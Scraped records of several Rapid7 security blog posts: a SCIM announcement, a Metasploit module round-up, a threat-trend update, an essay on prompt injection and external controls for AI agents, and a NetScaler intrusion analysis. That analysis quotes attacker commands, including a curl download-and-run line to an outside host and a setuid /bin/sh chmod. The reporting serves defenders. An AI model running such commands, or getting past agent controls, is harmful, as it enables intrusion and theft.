+6aeb2e32d7a4,6aeb2e32d7a4,2026-10-27 12:24 UTC,General Security News,Rapid7,Rapid7 Blog,Identity Security Posture Management; Data Security Posture Management,Article,Simplify User Access Management with SCIM on Rapid7 Command Platform,https://www.rapid7.com/blog/post/pt-scim-simplifies-user-access-management-uam-command-platform,Keep user information current: Synchronize supported user attributes as information changes,"Managing access to security tools shouldn't require another manual process. As organizations grow, keeping user accounts and permissions up to date becomes increasingly complex. Employees join, change roles, and leave, creating a constant need to update access across applications.
+
+When these processes rely on manual administration, delays and oversights can introduce unnecessary work and security risk.
+
+Rapid7 Command Platform now supports System for Cross-domain Identity Management (SCIM), enabling customers to automate user provisioning and deprovisioning through their existing identity provider (IdP).
+
+This helps organizations reduce administrative overhead, maintain more consistent access controls, and manage identity at scale.
+
+Automate user access throughout the employee lifecycle
+
+SCIM is an open standard that enables identity providers, such as Okta, to automatically manage user accounts in connected applications.
+
+With SCIM enabled, Rapid7 Command Platform customers can:
+
+Automate provisioning: Create accounts when employees join or need access.
+
+Keep user information current: Synchronize supported user attributes as information changes.
+
+Simplify offboarding: Automatically deactivate accounts when users no longer require access.
+
+Manage groups at scale: Synchronize group membership to help streamline access administration.
+
+Rather than manually updating accounts in Command Platform, administrators can manage supported identity lifecycle changes through their existing IdP.
+
+Less administration, more consistent access control
+
+Consider a common scenario: An employee leaves the organization. Without automated provisioning, an administrator must remember to deactivate that employee's access across their applications. If an account is missed, it could remain active longer than intended.
+
+With SCIM, changes made in the organization's identity provider can automatically trigger corresponding account updates in Command Platform.
+
+By introducing SCIM at the platform level, Rapid7 helps organizations:
+
+Reduce operational overhead by eliminating repetitive account-management tasks.
+
+Strengthen access governance by reducing stale accounts and keeping user information aligned with identity provider policies.
+
+Scale more efficiently by centralizing identity lifecycle management for supported Command Platform applications.
+
+For organizations with security and compliance requirements, these capabilities also help support consistent onboarding and offboarding processes.
+
+Get started with SCIM
+
+SCIM support is now available to Rapid7 Command Platform customers.
+
+Platform administrators can configure SCIM through Command Platform's SSO settings using their existing identity provider. SCIM is disabled by default and requires configuration before automated provisioning begins.
+
+For prerequisites and setup instructions, visit the Command Platform SCIM integration documentation."
+339c7e44ab2f,339c7e44ab2f,2026-10-23 15:38 UTC,General Security News,Rapid7,Rapid7 Blog,Identity Security Posture Management; Vulnerability Management; Server & Workload Protection,Article,"Metasploit Wrap Up: Langflow, MongoDB, and More",https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-langflow-mongodb-and-more,"Missing authorization checks allow an attacker to retrieve the email, phone, organization, name, and SSO email addresses (ssoGoogleEmail, ssoGithubEmail, and others) of every user","This release adds multiple new modules, and 6 of those modules point at a single target: Langflow, the open-source LLM workflow builder. Together they cover an authentication bypass (CVE-2026-93680), 3 unauthenticated remote code execution paths (CVE-2026-0768, CVE-2026-0769, and CVE-2026-10134), and 2 authenticated code execution flaws (CVE-2026-7873 and CVE-2026-93674), spanning Langflow releases from 1.0.0 through 1.11.4. Thanks to the work of rmhowe425, with research credit to Peter Girnus and n0k0. Beyond Langflow, open source contributor kmkz contributed a pre-auth RCE chain against OpenCTI. MongoDB coverage has also been expanded with 3 new auxiliary modules plus an Apache Solr version scanner thanks to the work of community member h00die.
+
+New Module Content (11)
+
+4gaBoards Mass User Information Disclosure (CVE-2026-53959)
+
+Authors: Balachandar Gowrisankar, de3erve (GitHub), and lucquach (GitHub)
+
+Type: Auxiliary
+
+Pull request: #21831 contributed by anirbala98
+
+Path: gather/4gaboards_users_info_disclosure_cve_2026_53959
+
+CVE reference: CVE-2026-53959
+
+Description: Adds a module that exploits CVE-2026-53959, a broken access control vulnerability allowing mass user information disclosure in 4gaBoards versions 3.3.8 and below. The application's /api/users REST endpoint lets any authenticated user retrieve a full, unpaginated list of every user in the system. Missing authorization checks allow an attacker to retrieve the email, phone, organization, name, and SSO email addresses (ssoGoogleEmail, ssoGithubEmail, and others) of every user.
+
+Langflow AI Authentication Bypass (CVE-2026-93680)
+
+Author: Richard Howe
+
+Type: Auxiliary
+
+Pull request: #21942 contributed by rmhowe425
+
+Path: gather/langflow_auth_bypass_cve_2026_93680
+
+CVE reference: CVE-2026-93680
+
+Description: Adds a new auxiliary module that leverages CVE-2026-93680, an authentication bypass vulnerability impacting Langflow versions 1.5.0 through 1.11.4.
+
+Apache Solr Version Scanner
+
+Author: h00die
+
+Type: Auxiliary
+
+Pull request: #22006 contributed by h00die
+
+Path: scanner/http/apache_solr_version
+
+Description: Adds a new scanner that identifies Apache Solr and reports its version.
+
+MongoDB Auxiliary Module Suite
+
+Authors: h00die and prithvee07
+
+Type: Auxiliary
+
+Pull request: #21785 contributed by h00die
+
+Description: Adds the mongodb_version, mongodb_schemadump, and mongodb_hashdump auxiliary modules, and updates the existing mongodb_login module.
+
+This PR adds the following modules:
+
+scanner/mongodb/mongodb_hashdump
+
+scanner/mongodb/mongodb_schemadump
+
+scanner/mongodb/mongodb_version
+
+OpenCTI Authentication Bypass and Notifier EJS Remote Code Execution
+
+Author: Jean-Marie Bourbon
+
+Type: Exploit
+
+Pull request: #21826 contributed by kmkz
+
+Path: linux/http/opencti_notifier_rce
+
+CVE references: CVE-2026-27960 and CVE-2026-39980
+
+Description: Adds a new exploit module for OpenCTI that chains CVE-2026-27960 and CVE-2026-39980 to achieve unauthenticated remote command execution.
+
+Grafana SQL Expressions DuckDB Command Injection (CVE-2024-9264)
+
+Author: Özcan Ersan (@ozcanpng)
+
+Type: Exploit
+
+Pull request: #21901 contributed by ozcanpng
+
+Path: multi/http/grafana_sql_expressions_rce_cve_2024_9264
+
+CVE reference: CVE-2024-9264
+
+Description: Adds an authenticated exploit module for CVE-2024-9264, a DuckDB command injection in Grafana SQL Expressions.
+
+Langflow AI Code Validation Authenticated RCE (CVE-2026-7873)
+
+Authors: Richard Howe and n0k0
+
+Type: Exploit
+
+Pull request: #21877 contributed by rmhowe425
+
+Path: multi/http/langflow_auth_rce_cve_2026_7873
+
+CVE reference: CVE-2026-7873
+
+Description: Adds a new exploit module that detects and exploits CVE-2026-7873, an authenticated RCE vulnerability impacting Langflow versions 1.0.0 through 1.10.0.
+
+Langflow AI Authenticated Command Injection (CVE-2026-93674)
+
+Author: Richard Howe
+
+Type: Exploit
+
+Pull request: #21939 contributed by rmhowe425
+
+Path: multi/http/langflow_auth_command_injection_cve_2026_93674
+
+CVE reference: CVE-2026-93674
+
+Description: Adds a new exploit module that detects and exploits CVE-2026-93674, an authenticated blind command injection vulnerability impacting Langflow versions 1.5.0 through 1.9.0.
+
+Langflow AI Validate Code Injection Unauth RCE (CVE-2026-0768)
+
+Authors: Peter Girnus and Richard Howe
+
+Type: Exploit
+
+Pull request: #21864 contributed by rmhowe425
+
+Path: multi/http/langflow_unauth_rce_cve_2026_0768
+
+CVE reference: CVE-2026-0768
+
+Description: Adds a new exploit module that detects and exploits CVE-2026-0768, an unauthenticated remote code execution vulnerability impacting Langflow version 1.4.2.
+
+Langflow AI Custom Component Eval Injection Unauth RCE (CVE-2026-0769)
+
+Authors: Peter Girnus and Richard Howe
+
+Type: Exploit
+
+Pull request: #21867 contributed by rmhowe425
+
+Path: multi/http/langflow_unauth_rce_cve_2026_0769
+
+CVE reference: CVE-2026-0769
+
+Description: Adds a new exploit module that detects and exploits CVE-2026-0769, an unauthenticated RCE vulnerability impacting Langflow version 1.3.2.
+
+Langflow AI Public Flow Build Unauth RCE (CVE-2026-10134)
+
+Author: Richard Howe
+
+Type: Exploit
+
+Pull request: #21875 contributed by rmhowe425
+
+Path: multi/http/langflow_unauth_rce_cve_2026_10134
+
+CVE reference: CVE-2026-10134
+
+Description: Adds a new exploit module that detects and exploits CVE-2026-10134, an unauthenticated remote code execution vulnerability impacting Langflow versions 1.0.0 through 1.9.3.
+
+Enhancements and Features (3)
+
+#20944 from Nayeraneru - Adds specs to ensure the mkdir post API behaves consistently.
+
+#21915 from vjonline - Consolidates reverse handler bind address handling into a shared Msf::Handler::Reverse::Bind module.
+
+#22041 from adfoster-r7 - Adds multiple Meterpreter improvements. The Windows Meterpreter has a major reflective-loader/IAT-import reduction, as well as improved WinAPI/error handling, and MinGW/CMake build refinements. The Python Meterpreter has improvements to Windows stat support and FreeBSD process listing. The PHP Meterpreter resolves PHP UDP channel read bugs. All Meterpreters now align on recursive mkdir -p capabilities.
+
+Bugs Fixed (6)
+
+#21490 from h00die - Fixes a crash when fingerprinting HTTP services that contained null bytes.
+
+#21979 from adfoster-r7 - Adds additional HTTP redirect checks to multiple modules.
+
+#21994 from adfoster-r7 - Adds additional FTP PASV IP validation checks to multiple modules.
+
+#22001 from Suryanshuv14 - Fixes DirtyClone module metadata and a typo.
+
+#22002 from mjatin2007 - Fixes leaking TCP sockets and file descriptors when the MSSQL Login Scanner module or the MSSQL session type is used.
+
+#22014 from cgranleese-r7 - Fixes false positives in the detection logic of the auxiliary/gather/hikvision_info_disclosure_cve_2017_7921, auxiliary/gather/magento_xxe_cve_2024_34102, and auxiliary/scanner/http/elasticsearch_traversal modules.
+
+Documentation
+
+You can find the latest Metasploit documentation on our docsite at docs.metasploit.com.
+
+Get it
+
+As always, you can update to the latest Metasploit Framework with msfupdate and you can get more details on the changes since the last blog post from GitHub:
+
+Pull Requests 6.5.6…6.5.8
+
+Full diff 6.5.6…6.5.8
+
+If you are a git user, you can clone the Metasploit Framework repo (master branch) for the latest. To install fresh without using git, you can use the open-source-only Nightly Installers or the commercial edition Metasploit Pro"
+cda4e1a9913d,cda4e1a9913d,2026-10-21 13:00 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,Vulnerability Management; Threat Intelligence,Article,Q3 2026 Threat Update: Attackers Are Exploiting Vulnerabilities Within 3 Days,https://www.rapid7.com/blog/post/tr-q3-2026-threat-update-attackers-exploiting-vulnerabilities-within-3-days,Attackers are exploiting vulnerabilities that require no interaction Q3's vulnerability data reveals another concerning pattern: Of the 43 newly exploited high- and critical-...,"Three days is the average time between a high-severity vulnerability becoming public and its exploitation, according to the latest Quarterly Threat Landscape Report from Rapid7. And 71% of the exploitation tracked in Q3 occurred within the first seven days.
+
+For security teams already managing growing vulnerability backlogs, this creates a difficult question: How do you reduce exposure when attackers can exploit vulnerabilities before your next patching window?
+
+Rapid7's Q3 2026 research brings together vulnerability intelligence, ransomware activity, APT tracking, and underground forum intelligence to show where attacker activity is concentrated.
+
+The exploitation window has narrowed, big time
+
+Rapid7 tracked 43 newly exploited high- and critical-severity vulnerabilities this quarter, down 7% from Q2 but still 19% higher than the same period last year.
+
+The number of newly exploited vulnerabilities isn't growing at the same rate as disclosures. The more pressing concern is how quickly attackers exploit the vulnerabilities they choose. On average, exploitation occurred just three days after public disclosure. The report also found that 80% of tracked exploitation occurred within 14 days and 90% within 30 days.
+
+That timeline creates a serious challenge for organizations relying on fixed remediation schedules. It also reinforces the need to distinguish between vulnerabilities that are theoretically severe and those that pose an immediate, exploitable risk.
+
+The report examines the exploitation timeline in greater detail, including the vulnerability characteristics that make certain exposures particularly attractive to attackers.
+
+Attackers are exploiting vulnerabilities that require no interaction
+
+Q3's vulnerability data reveals another concerning pattern: Of the 43 newly exploited high- and critical-severity vulnerabilities tracked, 34 (79%) required no authentication or user interaction.
+
+This provides attackers a potential path into exposed systems, no stolen credentials or malicious content interaction necessary. An internet-facing service with an exploitable vulnerability may require immediate attention, particularly when an attacker can reach it without authenticating.
+
+This makes attack surface visibility and contextual prioritization essential. Security teams need to understand which systems are externally accessible, which vulnerabilities are actively exploited, and whether existing controls can prevent or limit compromise.
+
+A CVSS score alone won’t give you the answers. The report explores the characteristics of exploited vulnerabilities and why understanding reachability is critical to reducing risk.
+
+AI is taking on a more operational role in attacks
+
+In Q3, 8% of the threat reporting tracked by Rapid7 cited AI as an operational component. The research identifies a shift from using AI primarily to help draft content or code toward supporting tactical decisions and execution within attack campaigns.
+
+In the documented cases, human operators continued to select targets and determine objectives, but relied on AI assistance for technique selection, target assessment, and adapting when an attack step failed.
+
+The report also examines how threat actors split malicious objectives across multiple AI sessions to evade provider safeguards. There are serious implications for detection in these findings. AI-enabled attacks also reinforce the value of monitoring and quickly adapting to attacker behavior rather than relying exclusively on known malware signatures or threat actor identities.
+
+The report provides additional context on how AI appeared in tracked campaigns and what defenders should monitor.
+
+The next step: Prioritize exposure before attackers exploit it
+
+Q3's findings reveal a challenge that vulnerability counts alone can’t explain. Attackers exploited 43 newly tracked vulnerabilities this quarter, yet the average exploitation window was just three days. Meanwhile, underground forum monitoring identified 41 posts advertising RDP or network access, demonstrating continued interest in selling access to compromised environments.
+
+Security teams must account for both the vulnerabilities attackers can exploit directly and the access they can obtain through other means.
+
+Start by identifying externally accessible assets and the vulnerabilities affecting them. Prioritize known exploitation, unauthenticated access paths, and systems supporting critical business functions. Where immediate remediation isn't possible, assess compensating controls and detection coverage.
+
+The latest Rapid7 Quarterly Threat Landscape Report brings together vulnerability research, ransomware intelligence, nation-state activity, and dark web monitoring to help security teams understand where threats are concentrated and what to address first. Download and read it now."
+01a4ea701fe6,01a4ea701fe6,2026-10-19 16:34 UTC,"Attacks, Breaches & Threat Intel",Rapid7,Rapid7 Blog,AI Security,Article,Your Next Insider Threat Won’t be Human: Securing AI Agents From the Outside in,https://www.rapid7.com/blog/post/ai-inhuman-insider-threats-securing-agents,The industry has largely settled on one framing: AI agents are the new insider threat but that label only tells us half of the story,"Why the controls on an AI agent have to live outside of it, and what a security operations team can do to implement and maintain those controls.
+
+The new privileged user in your environment
+
+Security teams spent two decades learning how to work with the people they trust most. Domain admins, DBAs, finance approvers and contractors with VPN access all get a mature playbook: verified identity, scoped access, logged activity and a fast way to revoke it all.
+
+Today, we’re navigating the same kind of access with regard to AI agents. They read our mailboxes, query our data lakes, open tickets, push code and increasingly, act on production systems. Unlike a new hire, an agent can’t be interviewed, background-checked or made to sign an acceptable-use policy.
+
+The industry has largely settled on one framing: AI agents are the new insider threat but that label only tells us half of the story. It tells us who to worry about, not where the controls should sit. Our argument is that the answer is a security idea from 1972, the reference monitor, and that the SOC is where it gets enforced in practice.
+
+Why agents break the trust model we had
+
+With traditional software, a security incident ends in a root cause. You find the vulnerable function, the misconfigured rule or the bad commit, and you fix it. The behavior lived in code we could read.
+
+Large language models don't give us that. We can't point to the training example or the set of weights that produced a specific decision. The same prompt can produce different actions on different runs. For a defender, that removes the most basic assumption we rely on: that the system will do tomorrow what it did today.
+
+The attack surface changes too, and computer science has an old name for this problem: the confused deputy. This is a trusted program tricked into misusing its own authority on someone else's behalf. An agent that reads a poisoned email, web page or document and then acts on hidden instructions is a confused deputy with API keys. No password is stolen and no exploit fires, which makes the agent's permissions the real blast radius, not the model's intelligence.
+
+Where the insider analogy holds, and where it breaks
+
+Most discussion of agents as insiders focuses on two gaps: agents have no career to lose, and they act at machine speed. Both are real. From a detection and forensics seat, though, four other differences change the work more:
+
+Difference
+
+Human insider
+
+AI agent
+
+What it means for defenders
+
+Monoculture
+
+One person fails on their own
+
+Many identical copies share one weakness
+
+Treat a working injection like a wormable bug: fix the fleet, not one instance
+
+Replayability
+
+Events can be reconstructed and the person interviewed
+
+The same input can produce a different action on a rerun
+
+Forensics must rest on recorded inputs and tool calls, not on replaying the agent
+
+Command channel
+
+Instructions come from a manager
+
+Instructions arrive mixed in with the data it processes
+
+Any content the agent reads is a potential command
+
+Self-report
+
+A person can be questioned and cross-checked
+
+Its account of its reasoning may not match what it did
+
+Evidence must come from outside the agent
+
+The last row matters most. We can't make an agent's self-reported reasoning the basis of trust, because we don't yet know how to guarantee that reasoning is faithful. Evidence has to come from outside the agent.
+
+Put the controls outside the model
+
+If the model can't be fully trusted, the controls that govern it can't live inside of it. A system prompt that says ""never delete production data"" is a suggestion, not a control. A well-crafted injection can talk the model out of it.
+
+Security architects solved a version of this problem in the 1970s with the reference monitor: a mechanism that checks every access request, can't be bypassed and can't be tampered with by the program it governs. For AI agents, that means separating three things: the model that reasons, the harness that orchestrates it and the policy layer that decides which actions are actually allowed.
+
+Figure 1: Agent control architecture · enforcement outside the model
+
+The agent can propose anything, but only the enforcement point decides what reaches real systems, and every decision lands in a log the agent can't alter.
+
+A security playbook for AI agents
+
+None of these controls are new. What's new is applying them consistently to a non-human actor that reasons, plans and acts.
+
+Give every agent its own identity. An agent should never run under a shared service account or a person's own credentials. It needs an identity that can be scoped, monitored, and revoked independently.
+
+Enforce least privilege on actions, not just data. Define an explicit action space: which tools, which APIs, which parameters. High-impact actions like payments, deletions or production changes need step-up approval from a human.
+
+Log everything in a place the agent can't touch. Every tool call, input, and output goes to tamper-evident storage outside the agent's reach. You should be able to reconstruct what happened without asking the agent.
+
+Never let a model grade its own work. Use a different model, a deterministic rule, or a human to verify important outcomes. Avoid depending on a single model vendor for anything critical.
+
+Red team continuously. Test prompt injection, tool misuse, data exfiltration, and edge cases, not just the happy path. Re-test every time the model, the prompt, or the tool set changes.
+
+Build a kill switch before you need it. In May 2017, WannaCry was stopped by luck. A researcher registered a nonsense domain hard-coded in the ransomware, and new infections stopped spreading because the malware checked that domain before running. Defenders didn't build that kill switch. They found it in the attacker's code, it did nothing for machines already encrypted, and later variants simply removed it. Agent fleets can't depend on that kind of luck. The stop control has to be ours, sit outside the agent, cut off its credentials and tool access mid-run, and be tested regularly, the way an EDR host isolation action is.
+
+Disclose and share incidents. When an agent misbehaves, tell the people affected, document which control failed and share the lessons with the wider community, the same way we share threat intelligence today.
+
+Persistent memory is a new risk. Agents with long-term memory can be poisoned once and stay compromised. Add memory state to ""log everything"" and ""quarantine its outputs.""
+
+Bring agents into the Security Operations Center (SOC)
+
+Logging alone doesn't protect anyone, as no human team can review millions of agent actions, and handing that review to another unsupervised model just adds another black box. The SOC needs to treat agent activity as a first-class telemetry source, the way it treats endpoints, identities and cloud workloads today.
+
+In practice, that means:
+
+Behavioral baselines per agent. Know which tools, data sources and destinations each agent normally uses, and alert on deviations, such as a code-review agent that starts reading the finance file share.
+
+Detections for agent-specific attacks. Write rules for prompt-injection indicators, unusual tool chaining, sudden bursts of high-privilege actions and data flowing to unexpected destinations.
+
+Correlation with the rest of the environment. Tie agent actions to the user, the session, the content the agent read, and the systems it touched, so an investigation can follow the full chain.
+
+Response playbooks. Pause the agent, revoke its tokens, quarantine its outputs and roll back its changes, with the same speed we expect when isolating a compromised host.
+
+The security industry can lead in this area, as we already know how to collect noisy telemetry, find the signal, and contain threats quickly. Agents are the next category of asset to protect, and the next category of actor to watch.
+
+Trust the architecture, not the model
+
+Models will keep getting smarter, and vendors will keep promising they're safer. Both may be true, but neither removes our responsibility for what an agent does inside our environment with our data and our credentials.
+
+The goal isn't to find a model we can trust completely. It's to build a system that stays safe even when the model gets it wrong. Security teams have done this for people, networks, and endpoints for decades. AI agents are simply the next privileged insider, and it's time we treated them that way."
+e9bcbf5297ed,8747d0535da2,2026-10-19 15:11 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,Network Security; Vulnerability Management; Identity Security Posture Management; File Security,Article,Rapid7 Analysis: NetScaler intrusions chaining CVE-2026-88771 and CVE-2026-88779,https://www.rapid7.com/blog/post/ra-netscaler-intrusions-chaining-cve-2026-88771-and-cve-2026-88779,gov/news-events/alerts/2026/09/27/critical-zero-day-vulnerabilities-exploited-citrix-netscaler-adc-gateway https://unit42,"Overview
+
+In early October 2026, Rapid7 analysts investigated a compromise of a Citrix NetScaler ADC appliance. The appliance was running an affected 14.1 build and was exposed to active exploitation targeting NetScaler authentication and SAML deployments.
+
+The intrusion achieved root code execution, deployed multiple persistence mechanisms, installed PHP web shells, created outbound command-and-control and internal tunnelling capabilities, performed targeted reconnaissance of DNS, LDAP/Active Directory, management services and VMware vCenter infrastructure, and exfiltrated NetScaler configuration and key material.
+
+The activity overlaps with public reporting on the WHIPSHOT/SLAPSHOT NetScaler campaign. However, this case provides additional detail on the operational lifecycle, including repeated post-reboot execution through the crash-handling workflow, HA-aware persistence, a dedicated Go reconnaissance tool, a separate FreeBSD proxy agent, and a staged collection pipeline.
+
+Key findings
+
+The first confirmed root execution occurred shortly after attacker-controlled text was inserted into a NetScaler authentication username.
+
+The injected text caused or immediately preceded repeated nsaaad crashes and a Pitboss reboot.
+
+After reboot, the NetScaler call-home crash handler processed the retained attacker-controlled text and executed a payload as root.
+
+The attacker installed cookie-authenticated PHP web shells behind CSS-looking Apache aliases.
+
+The attacker set /bin/sh to mode 6555, allowing an unprivileged web process to obtain effective root privileges.
+
+The implant framework maintained access through cron, rc.netscaler, watchdog loops, an outbound reverse agent, and an HTTP-fronted TCP proxy.
+
+HA synchronization and forced failover logic attempted to preserve access across the appliance pair.
+
+A Go tool mapped internal routes, DNS, LDAP/AD, management services and VMware vCenter systems.
+
+NetScaler configuration, historical configurations, HTTP configuration, diagnostics and system backup material were staged for exfiltration.
+
+Technical Analysis
+
+Initial access
+
+The first event was an authentication request containing attacker-controlled text similar to:
+
+pitboss PPE unexpectedly died NSPPE;fetch${IFS}-qo${IFS}/v ...;sh${IFS}/v;#
+
+The observed chain was:
+
+Figure 1: Sequence diagram showing the attack chain
+
+Logs collected show attackers chaining CVE-2026-88771, the pre-authentication log-poisoning/RCE issue, with CVE-2026-88779, the separate SAML-parsing crash. A two-vulnerability sequence in which the SAML parsing flaw supplies a crash/reboot condition while the log-poisoning flaw supplies attacker-controlled command text.
+
+The evidence demonstrates more than an attempted chain: the injected command, nsaaad crash loop, Pitboss reboot, post-reboot handler activity, and root payload execution are all directly correlated across independent logs and filesystem timestamps. The first implant files were created at the same second as the first logged post-reboot execution, and later stages, web shells, tunnels, reconnaissance tooling and exfiltration were confirmed.
+
+Rapid7 also published an ETR on the Netscaler zero days currently exploited in the wild.
+
+Repeated post-reboot execution
+
+The initial execution was not a one-time event. The appliance recorded repeated Pitboss-initiated reboots and repeated call-home handler executions over several days.
+
+The handler re-executed stages from multiple infrastructure addresses and the repeated execution model allowed the operator to refresh persistence, deploy new components and continue collection after appliance restarts.
+
+The crash-handling path functioned as a delayed and repeatable execution trampoline, the chaining happened to avoid waiting 24h for the injected payload to run.
+
+Payload evolution
+
+Two .slap dropper versions were recovered:
+
+17447d.sh (earlier version) SHA-256: a0ba4e1ad622d9c3d950b4156d4430812d05bee216ab22c3804a9f7a80535556
+
+and:
+
+1.sh SHA-256: 6774bfed99da38cec82e721de4bd64a67db7840efadcc71e7df02eb6f0a03c44
+
+The later version added reverse-agent functionality, relay installation, HA recovery, stage tracking, and structured upload logging, indicating operational maturation during the campaign.
+
+The nsvmd installer branch was separately identified as:
+
+2.sh / r.sh SHA-256: 56a892d80096a9db4ca473a9c3109729c60a5ba901d6ba65948bdb1f4a6fb186
+
+Persistence and web shells
+
+The main framework used a directory under /nsconfig/.slap.
+
+/nsconfig/.slap/vc /nsconfig/.slap/vcscan-agent.sh /nsconfig/.slap/agent.pl /nsconfig/.slap/bridge.pl /nsconfig/.slap/boot.sh /nsconfig/.slap/reverse-agent.sh
+
+It deployed three web shell copies into the LogonPoint custom web directory:
+
+.slap.receiver .ctxs.receiver receiver.deb
+
+The shells used a cookie-based command channel. Commands were supplied through a second cookie and returned through an HTTP 404 response body. The 404 response helped the shell blend into normal web traffic and made successful command requests resemble missing resources.
+
+The attacker modified Apache configuration to:
+
+execute .deb files as PHP;
+
+enable PHP execution;
+
+map CSS-looking URLs to .slap.receiver;
+
+accept randomized hexadecimal CSS suffixes;
+
+preserve an attacker backup of the HTTP configuration.
+
+The alias created were the following:
+
+/logon/LogonPoint/custom/receiver.v2.min.css /logon/LogonPoint/custom/receiver.v2.min.<hex>.css ↓ /var/netscaler/logon/LogonPoint/custom/.slap.receiver
+
+TA repeatedly set:
+
+chmod 6555 /bin/sh
+
+This made the shell setuid and setgid. Because Apache normally runs with reduced privileges, this provided a path for the PHP web shell to obtain effective root privileges.
+
+The framework also reseeded cron entries and boot hooks whenever it ran. This made the compromise resilient to reboots, image regeneration and loss of individual cron entries.
+
+Tunnelling and command channels
+
+The intrusion deployed multiple redundant access paths.
+
+Perl TCP session manager
+
+agent.pl created a loopback listener on an ephemeral port and recorded it in /tmp/.uxdport
+
+It used /tmp/.uxdlock for process coordination and supported operations including:
+
+ping open push pull exch close
+
+The open operation accepted arbitrary destination hosts and ports, turning the NetScaler into an internal TCP pivot.
+
+Python HTTP tunnel
+
+The Python components provided a local session manager and HTTP front end:
+
+it accepted base64 commands in an HTTP header and returned tunnel responses in HTTP 404 bodies. This behavior overlaps with publicly reported WHIPSHOT/SLAPSHOT tooling.
+
+Outbound reverse agent
+
+The reverse agent polled an external command endpoint every 15 seconds, executed the received command with /bin/sh -c, and returned output using HTTP PUT. This gave the operator command execution without requiring an inbound connection to the appliance.
+
+HA-aware persistence
+
+The framework included explicit HA recovery logic:
+
+sync HA files all force HA failover
+
+The code attempted to synchronize implant files to the HA peer and, when appropriate, force failover so the node containing the implant became active.
+
+Internal reconnaissance
+
+A stripped, statically linked FreeBSD Go binary was recovered from the .slap directory. The tool was designed to map infrastructure reachable from the compromised appliance.
+
+It contains functionality associated with:
+
+local interface and route parsing;
+
+gateway-prefix discovery;
+
+subnet expansion;
+
+DNS server and domain discovery;
+
+DNS zone-transfer hunting;
+
+LDAP anonymous bind and RootDSE queries;
+
+LDAP searches;
+
+management-service checks;
+
+TLS certificate inspection;
+
+VMware vCenter classification.
+
+A launcher named vcscan-agent.sh downloaded and validated the scanner as scanner-freebsd-amd64, installed it as /nsconfig/.slap/vc, and ran two stages: broad scanning of RFC1918 space and management-focused scanning of ranges derived from DNS and LDAP results. The launcher collected route, DNS, LDAP, management and vCenter results into files such as:
+
+vcpersist-<token>_dns_candidates.tsv vcpersist-<token>_dns_ldap_verified.tsv vcpersist-<token>_vcenter_verified_all.txt
+
+It then compressed and uploaded the results to the operator infrastructure.
+
+This reconnaissance component addition confirms the campaign is active and developing, mapping the identity, management and virtualization infrastructure from a compromised ADC vantage point.
+
+nsvmd proxy
+
+The second payload branch deployed a FreeBSD Go agent named nsvmd through injection of 2.sh/r.sh under /flash/.nsvm/nsvmd:
+
+curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=<token>|sh
+
+The agent was started with:
+
+nsvmd -server v5v.in:443 -sni c.v5v.in
+
+The installer created a 45s watchdog (/flash/.nsvm/watchdog.sh), boot persistence through /nsconfig/rc.netscaler, 5 minute and daily cron persistence (/flash/.nsvm/guard.sh,/flash/.nsvm/restart.sh) marking nsvmd immutable using chflags uchg. Agent logs were collected under /flash/.nsvm/.agent.log and /flash/.nsvm/.wd.log.
+
+Configuration and key-material collection
+
+The attacker staged and uploaded:
+
+/nsconfig/ ns.conf.0 through ns.conf.4 ns.conf.bak /etc/httpd.conf system backup archives implant diagnostics
+
+The configuration archive could contain encrypted credentials, LDAP/RADIUS bind information, administrative configuration, SSL private keys and key-encryption material. The collection logic also uploaded manifests and stage logs and retried failed uploads.
+
+A separate archive was staged in the web root and successfully downloaded through an HTTP 200 request. The response size matched the staged archive size, providing direct evidence of configuration exfiltration through the web interface.
+
+MITRE ATT&CK techniques
+
+Technique ID
+
+Technique Name
+
+Tactic
+
+T1190
+
+Exploit Public-Facing Application
+
+Initial Access
+
+T1059.004
+
+Unix Shell
+
+Execution
+
+T1059.006
+
+Python
+
+Execution
+
+T1059.007
+
+JavaScript/PHP
+
+Execution
+
+T1105
+
+Ingress Tool Transfer
+
+Command and Control
+
+T1053.003
+
+Cron
+
+Persistence
+
+T1037.004
+
+RC Scripts
+
+Persistence
+
+T1505.003
+
+Web Shell
+
+Persistence
+
+T1548.001
+
+Setuid and Setgid
+
+Privilege Escalation
+
+T1027
+
+Obfuscated Files or Information
+
+Defense Evasion
+
+T1070.004
+
+File and Directory Removal
+
+Defense Evasion
+
+T1016
+
+System Network Configuration Discovery
+
+Discovery
+
+T1018
+
+Remote System Discovery
+
+Discovery
+
+T1046
+
+Network Service Scanning
+
+Discovery
+
+T1090.001
+
+Internal Proxy
+
+Command and Control
+
+T1552.001
+
+Credentials In Files
+
+Credential Access
+
+T1005
+
+Data from Local System
+
+Collection
+
+T1074.001
+
+Local Data Staging
+
+Collection
+
+T1560.001
+
+Archive Collected Data
+
+Collection
+
+T1071.001
+
+Web Protocols
+
+Command and Control
+
+T1573
+
+Encrypted Channel
+
+Command and Control
+
+T1132.001
+
+Standard Encoding
+
+Command and Control
+
+T1572
+
+Protocol Tunneling
+
+Command and Control
+
+T1041
+
+Exfiltration Over C2 Channel
+
+Exfiltration
+
+T1020
+
+Automated Exfiltration
+
+Exfiltration
+
+Table 1: MITRE ATT&CK Tactics and Techniques
+
+Indicators of compromise
+
+Path
+
+Description
+
+/nsconfig/.slap/
+
+Main framework directory
+
+/nsconfig/.relay/
+
+Relay implant directory
+
+/nsconfig/.slap/vc
+
+Reconnaissance scanner binary
+
+/nsconfig/.slap/vcscan-agent.sh
+
+Reconnaissance scanner launcher script
+
+/nsconfig/.slap/agent.pl
+
+Perl TCP session manager and pivot agent
+
+/nsconfig/.slap/bridge.pl
+
+Perl bridge script
+
+/nsconfig/.slap/boot.sh
+
+Boot persistence script
+
+/nsconfig/.slap/reverse-agent.sh
+
+Outbound reverse command execution agent
+
+/nsconfig/.relay/run.sh
+
+Relay runner script
+
+/nsconfig/.relay/target_agent.py
+
+Python relay agent script
+
+/flash/.nsvm/nsvmd
+
+FreeBSD Go proxy agent binary
+
+/flash/.nsvm/watchdog.sh
+
+45-second watchdog script for nsvmd
+
+/flash/.nsvm/guard.sh
+
+Cron persistence guard script
+
+/flash/.nsvm/restart.sh
+
+Daily restart script
+
+/flash/.nsvm/nsvmd.tmp
+
+Temporary nsvmd binary path
+
+/flash/.nsvm/.stop
+
+Uninstall/upgrade control marker
+
+/flash/.nsvm/.agent.log
+
+Agent log file
+
+/flash/.nsvm/.wd.log
+
+Watchdog log file
+
